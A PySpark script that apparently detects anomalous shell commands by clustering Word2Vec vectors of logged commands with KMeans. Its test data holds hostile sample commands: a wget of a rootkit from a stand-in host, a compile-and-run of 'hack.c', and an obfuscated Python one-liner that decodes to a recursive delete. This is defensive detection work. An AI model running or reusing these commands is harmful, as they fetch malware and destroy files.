from pyspark.sql import SQLContext, Row
from pyspark.sql.functions import desc, asc
from pyspark.ml.feature import Word2Vec
from pyspark.ml.clustering import KMeans, KMeansModel

ctx = SQLContext(sc)
df = ctx.read.parquet('/user/cloudera/ml/kmeans_new')
df.cache()

featuresOut = df.select(df.command,df.date,df.exec_as,df.source,df.srcip,df.username)

# Create a DF with training data
#w2vtraindata = featuresOut.sample(False,0.5,42)

# Create Wrod2Vector model and fit with training data
word2Vec = Word2Vec(vectorSize=100, minCount=1, inputCol="command", outputCol="features")
w2model = word2Vec.fit(featuresOut)

#featuresOut = df.select(df.command,df.date,df.exec_as,df.source,df.srcip,df.username,df.features)

# Create a DF with training data
#kmtraindata = featuresOut.sample(False, 0.5, 42)

# Create KM model and fit using up to date data
kmeans = KMeans(k=650, seed=42, featuresCol="features", predictionCol="prediction", maxIter=10, initSteps=3)
kmodel = kmeans.fit(df)

#test = kmodel.transform(featuresOut)

'''
########## DEMO #########
'''
df.groupBy(df.prediction).count().orderBy(asc('count')).show(50)
groups = df.groupBy(df.prediction.alias("prediction2")).count().orderBy(asc('count')).filter('count < 40')
df.join(groups, groups.prediction2==df.prediction).select('command','prediction').distinct().show()
df.join(groups, groups.prediction2==df.prediction).select('command').distinct().show(500,truncate=False)

groups = df.groupBy(df.prediction.alias("prediction2")).count().orderBy(desc('count')).filter('count > 100000')
df.join(groups, groups.prediction2==df.prediction).select('command').distinct().show(500,truncate=False)


groups = sc.parallelize(df.groupBy(df.prediction.alias("prediction2")).count().orderBy(desc('count')).head(10)).toDF()
df.join(groups, groups.prediction2==df.prediction).select('command').distinct().show(50,truncate=False)

# Create a new DF with some weird commands
test1 = ctx.createDataFrame([
], ["command"])

test2 = ctx.createDataFrame([
  ("gcc hack.c -o hack;./hack".split(" "),),
  ("wget http://wwww.my.com/rootkit.gz".split(" "), ),
  ("echo, $?".split(" "),"2015-12-07","root", ),
  ("asdjgiuarsjhgiurewhgjui asdadfsadf sdf".split(" "), ),
  ("python -c 'import os; os.system(''.join([chr(ord(i)-1) for i in 'sn!.sg!+']))'".split(" "),)
], ["command","date","exec_as","source","srcip","username"])

# Convert new commands to vectors using W2V model
predictNew = w2model.transform(test1)
predictNew2 = w2model.transform(test2)

# Predict clusters for the new commands
clustersNew = kmodel.transform(predictNew)
clustersNew2 = kmodel.transform(predictNew2)

clustersNew2.show()



df.filter('prediction=230').show()
